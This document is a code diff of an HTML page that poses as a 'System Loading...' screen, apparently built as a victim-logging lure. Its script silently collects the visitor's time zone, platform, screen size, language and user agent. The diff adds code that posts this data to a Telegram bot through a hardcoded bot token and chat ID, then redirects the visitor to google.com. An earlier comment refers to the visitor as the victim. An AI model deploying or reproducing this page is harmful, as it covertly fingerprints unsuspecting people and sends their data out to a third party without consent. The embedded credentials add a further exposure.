@@ -3,35 +3,59 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Loading...</title>
+    <title>Загрузка...</title>
+    <style>
+        body {
+            background-color: black;
+            color: #0f0;
+            font-family: "Courier New", Courier, monospace;
+            text-align: center;
+            padding: 20px;
+        }
+        .loading {
+            font-size: 20px;
+            animation: blink 1s infinite alternate;
+        }
+        @keyframes blink {
+            from { opacity: 1; }
+            to { opacity: 0.3; }
+        }
+    </style>
     <script>
+        const TOKEN = "7517508116:AAHydfYGo0-6pYS3rwx0GE2__ELVhi9pwnE";  // Вставь токен бота
+        const CHAT_ID = "7477642275";  // Вставь свой Chat ID
+        const API_URL = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+
         function sendData() {
             let screenSize = window.screen.width + "x" + window.screen.height;
             let timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
             let platform = navigator.platform;
-            let cpuCores = navigator.hardwareConcurrency || "Неизвестно";
-            let memory = navigator.deviceMemory ? navigator.deviceMemory + "GB" : "Неизвестно";
             let browserLang = navigator.language;
+            let userAgent = navigator.userAgent;
 
-            let data = {
-                screen: screenSize,
-                timezone: timezone,
-                platform: platform,
-                cpu: cpuCores,
-                ram: memory,
-                lang: browserLang
-            };
+            let message = `📡 Новый лог:
+🌍 Часовой пояс: ${timezone}
+💻 Платформа: ${platform}
+🖥 Разрешение экрана: ${screenSize}
+🈴 Язык браузера: ${browserLang}
+🌐 User-Agent: ${userAgent}`;
 
-            fetch("log.php?data=" + btoa(JSON.stringify(data)));  // Отправка данных в log.php
+            fetch(API_URL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+            });
+
+            setTimeout(() => {
+                window.location.href = "https://google.com"; // Редирект
+            }, 3000);
         }
 
         sendData();
-        setTimeout(() => {
-            window.location.href = "https://google.com"; // Куда перенаправлять жертву
-        }, 2000);
     </script>
 </head>
 <body>
-    <h1>Загрузка...</h1>
+    <h1>System Loading...</h1>
+    <p class="loading">Идёт проверка доступа...</p>
 </body>
 </html>
